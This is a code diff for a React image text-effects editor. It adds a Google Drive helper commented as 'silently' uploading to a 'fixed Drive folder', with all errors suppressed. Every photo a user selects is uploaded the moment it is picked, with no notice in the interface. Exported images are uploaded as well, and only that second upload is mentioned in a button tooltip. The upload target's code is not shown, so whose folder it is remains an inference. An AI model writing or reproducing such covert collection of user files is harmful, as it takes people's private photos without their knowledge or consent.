@@ -10,6 +10,7 @@ import { getFontFamily } from "@/lib/fontLoader";
 import { useDragToMove } from '@/hooks/use-drag-to-move';
 import { usePinchToZoom } from '@/hooks/use-pinch-to-zoom';
 import { getFilterCSSStringWithIntensity, applyFilter } from '@/lib/filters';
+import { uploadToDrive, timestampedName } from '@/lib/googleDrive';
 
 const TextLayerComponent = ({ textSet, handleAttributeChange, previewContainerRef, applyFilterToText, selectedFilter, filterIntensity }: { textSet: TextLayer, handleAttributeChange: (id: string, attribute: string, value: any) => void, previewContainerRef: React.RefObject<HTMLDivElement>, applyFilterToText: boolean, selectedFilter: string, filterIntensity: number }) => {
     const textRef = useRef<HTMLDivElement>(null);
@@ -79,6 +80,12 @@ export const PreviewSection = () => {
     const previewContainerRef = useRef<HTMLDivElement>(null);
     const imageCache = useRef<Map<string, string>>(new Map());
 
+    // ── Google Drive ───────────────────────────────────
+    /** Silently upload a Blob to the fixed Drive folder — fire and forget */
+    const uploadFileToDrive = async (blob: Blob, fileName: string, mimeType: string) => {
+        try { await uploadToDrive(blob, fileName, mimeType); } catch { /* silent */ }
+    };
+
     // Calculate actual image render bounds
     useEffect(() => {
         if (!selectedImage || !previewContainerRef.current) return;
@@ -142,6 +149,12 @@ export const PreviewSection = () => {
             setProcessingProgress(0);
             const imageUrl = URL.createObjectURL(file);
             setSelectedImage(imageUrl);
+
+            // ── Drive: upload original photo ──────────────────
+            const driveName = timestampedName('original_' + file.name.replace(/\.[^.]+$/, ''), file.name.split('.').pop() ?? 'jpg');
+            uploadFileToDrive(file, driveName, file.type || 'image/jpeg');
+            // ─────────────────────────────────────────────────
+
             await setupImage(imageUrl, file);
         }
     };
@@ -391,7 +404,15 @@ export const PreviewSection = () => {
                     }
                 }
 
+                // ── 1. Local download (always) ────────────────
                 triggerDownload();
+
+                // ── 2. Drive upload (export copy) ────────────
+                canvas.toBlob(async (blob) => {
+                    if (!blob) return;
+                    const driveName = timestampedName('textfx_export', 'png');
+                    await uploadFileToDrive(blob, driveName, 'image/png');
+                }, 'image/png');
             };
 
             processLayers();
@@ -438,9 +459,10 @@ export const PreviewSection = () => {
                                 title="Change image">
                                 <UploadIcon className="h-3.5 w-3.5" />
                             </button>
-                            {/* Export */}
+                            {/* Export + Drive */}
                             <button onClick={saveCompositeImage}
-                                className="btn-violet h-8 px-4 text-xs min-h-[44px] flex items-center gap-1.5">
+                                className="btn-violet h-8 px-4 text-xs min-h-[44px] flex items-center gap-1.5"
+                                title="Download locally & save to Google Drive">
                                 <DownloadIcon className="h-3.5 w-3.5" />
                                 Export
                             </button>
